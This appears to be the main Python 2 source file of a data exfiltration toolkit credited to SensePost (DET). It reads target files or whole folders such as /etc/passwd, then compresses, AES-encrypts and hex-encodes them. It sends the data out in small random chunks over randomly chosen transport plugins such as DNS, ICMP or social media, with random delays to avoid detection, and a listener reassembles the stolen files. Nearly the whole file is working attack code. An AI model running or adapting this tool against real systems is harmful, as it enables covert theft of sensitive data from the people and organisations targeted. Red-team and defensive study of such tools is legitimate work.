import os
import random
import threading
import hashlib
import argparse
import sys
import string
import time
import json
import signal
import struct
import tempfile
from random import randint
from os import listdir
from os.path import isfile, join
from Crypto.Cipher import AES
from zlib import compress, decompress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION    = True
files = {}
threads = []
config = None


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def display_message(message):
    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)


def warning(message):
    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))


def ok(message):
    display_message("%s%s%s" % (bcolors.OKGREEN, message, bcolors.ENDC))


def info(message):
    display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))


# http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
def aes_encrypt(message, key=KEY):
    try:
        # Generate random CBC IV
        iv = os.urandom(AES.block_size)

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)

        # Add PKCS5 padding
        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

        # Return data size, iv and encrypted message
        return iv + aes.encrypt(pad(message))
    except:
        return None

def aes_decrypt(message, key=KEY):
    try:
        # Retrieve CBC IV
        iv = message[:AES.block_size]
        message = message[AES.block_size:]

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
        message = aes.decrypt(message)

        # Remove PKCS5 padding
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]

        return unpad(message)
    except:
        return None

# Do a md5sum of the file
def md5(fname):
    hash = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash.update(chunk)
    return hash.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
    'aes_encrypt' : aes_encrypt,
    'aes_decrypt': aes_decrypt
}


class Exfiltration(object):

    def __init__(self, results, KEY):
        self.KEY = KEY
        self.plugin_manager = None
        self.plugins = {}
        self.results = results
        self.target = "127.0.0.1"

        path = "plugins/"
        plugins = {}

        # Load plugins
        sys.path.insert(0, path)
        for f in os.listdir(path):
            fname, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_plugin(fname):
                mod = __import__(fname)
                plugins[fname] = mod.Plugin(self, config["plugins"][fname])

    def should_use_plugin(self, plugin_name):
        # if the plugin has been specified specifically (-p twitter)
        if self.results.plugin and plugin_name not in self.results.plugin.split(','):
            return False
        # if the plugin is not in the exclude param
        elif self.results.exclude and plugin_name in self.results.exclude.split(','):
            return False
        else:
            return True

    def register_plugin(self, transport_method, functions):
        self.plugins[transport_method] = functions

    def get_plugins(self):
        return self.plugins

    def aes_encrypt(self, message):
        return aes_encrypt(message, self.KEY)

    def aes_decrypt(self, message):
        return aes_decrypt(message, self.KEY)

    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def get_random_plugin(self):
        plugin_name = random.sample(self.plugins, 1)[0]
        return plugin_name, self.plugins[plugin_name]['send']

    def use_plugin(self, plugins):
        tmp = {}
        for plugin_name in plugins.split(','):
            if (plugin_name in self.plugins):
                tmp[plugin_name] = self.plugins[plugin_name]
        self.plugins.clear()
        self.plugins = tmp

    def remove_plugins(self, plugins):
        for plugin_name in plugins:
            if plugin_name in self.plugins:
                del self.plugins[plugin_name]
        display_message("{0} plugins will be used".format(
            len(self.get_plugins())))

    def register_file(self, message):
        global files
        jobid = message[0]
        if jobid not in files:
            files[jobid] = {}
            files[jobid]['checksum'] = message[3].lower()
            files[jobid]['filename'] = message[1].lower()
            files[jobid]['data'] = []
            files[jobid]['packets_number'] = []
            files[jobid]['packets_len'] = -1
            warning("Register packet for file %s with checksum %s" %
                    (files[jobid]['filename'], files[jobid]['checksum']))

    def retrieve_file(self, jobid):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(
            os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
        #Reorder packets before reassembling / ugly one-liner hack
        files[jobid]['packets_number'], files[jobid]['data'] = \
                [list(x) for x in zip(*sorted(zip(files[jobid]['packets_number'], files[jobid]['data'])))]
        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
        content = aes_decrypt(content, self.KEY)
        if COMPRESSION:
            content = decompress(content)
        f = open(filename, 'w')
        f.write(content)
        f.close()
        if (files[jobid]['checksum'] == md5(filename)):
            ok("File %s recovered" % (fname))
        else:
            warning("File %s corrupt!" % (fname))
        del files[jobid]

    def retrieve_data(self, data):
        global files
        try:
            message = data
            if (message.count("|!|") >= 2):
                info("Received {0} bytes".format(len(message)))
                message = message.split("|!|")
                jobid = message[0]

                # register packet
                if (message[2] == "REGISTER"):
                    self.register_file(message)
                # done packet
                elif (message[2] == "DONE"):
                    files[jobid]['packets_len'] = int(message[1])
                    #Check if all packets have arrived
                    if files[jobid]['packets_len'] == len(files[jobid]['data']):
                        self.retrieve_file(jobid)
                    else:
                        warning("[!] Received the last packet, but some are still missing. Waiting for the rest...")
                # data packet
                else:
                    # making sure there's a jobid for this file
                    if (jobid in files and message[1] not in files[jobid]['packets_number']):
                        files[jobid]['data'].append(''.join(message[2:]))
                        files[jobid]['packets_number'].append(int(message[1]))
                        #In case this packet was the last missing one
                        if files[jobid]['packets_len'] == len(files[jobid]['data']):
                            self.retrieve_file(jobid)
        except:
            raise
            pass


class ExfiltrateFile(threading.Thread):

    def __init__(self, exfiltrate, file_to_send):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.exfiltrate = exfiltrate
        self.jobid = ''.join(random.sample(
            string.ascii_letters + string.digits, 7))
        self.checksum = md5(file_to_send)
        self.daemon = True

    def run(self):
        # registering packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))

        warning("[!] Registering packet for the file")
        data = "%s|!|%s|!|REGISTER|!|%s" % (
            self.jobid, os.path.basename(self.file_to_send), self.checksum)
        plugin_send_function(data)

        time_to_sleep = randint(1, MAX_TIME_SLEEP)
        info("Sleeping for %s seconds" % time_to_sleep)
        time.sleep(time_to_sleep)

        # sending the data
        f = tempfile.SpooledTemporaryFile()
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(aes_encrypt(data, self.exfiltrate.KEY))
        f.seek(0)
        e.close()

        packet_index = 0
        while (True):
            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
            if not data_file:
                break
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
            ok("Using {0} as transport method".format(plugin_name))
            # info("Sending %s bytes packet" % len(data_file))

            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
            plugin_send_function(data)
            packet_index = packet_index + 1

            time_to_sleep = randint(1, MAX_TIME_SLEEP)
            display_message("Sleeping for %s seconds" % time_to_sleep)
            time.sleep(time_to_sleep)

        # last packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))
        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
        plugin_send_function(data)
        f.close()
        sys.exit(0)


def signal_handler(bla, frame):
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
    global threads, config

    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    parser.add_argument('-e', action="store", dest="exclude",
                        default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
    parser.add_argument('-L', action="store_true",
                        dest="listen", default=False, help="Server mode")
    results = parser.parse_args()

    if (results.config is None):
        print "Specify a configuration file!"
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    MIN_TIME_SLEEP = int(config['min_time_sleep'])
    MAX_TIME_SLEEP = int(config['max_time_sleep'])
    MIN_BYTES_READ = int(config['min_bytes_read'])
    MAX_BYTES_READ = int(config['max_bytes_read'])
    COMPRESSION    = bool(config['compression'])
    KEY = config['AES_KEY']
    app = Exfiltration(results, KEY)

    # LISTEN MODE
    if (results.listen):
        threads = []
        plugins = app.get_plugins()
        for plugin in plugins:
            thread = threading.Thread(target=plugins[plugin]['listen'])
            thread.daemon = True
            thread.start()
            threads.append(thread)
    # EXFIL mode
    else:
        if (results.folder is None and results.file is None):
            warning("[!] Specify a file or a folder!")
            parser.print_help()
            sys.exit(-1)
        if (results.folder):
            files = ["{0}{1}".format(results.folder, f) for
                     f in listdir(results.folder)
                     if isfile(join(results.folder, f))]
        else:
            files = [results.file]

        threads = []
        for file_to_send in files:
            info("Launching thread for file {0}".format(file_to_send))
            thread = ExfiltrateFile(app, file_to_send)
            threads.append(thread)
            thread.daemon = True
            thread.start()

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break

if __name__ == '__main__':
    main()
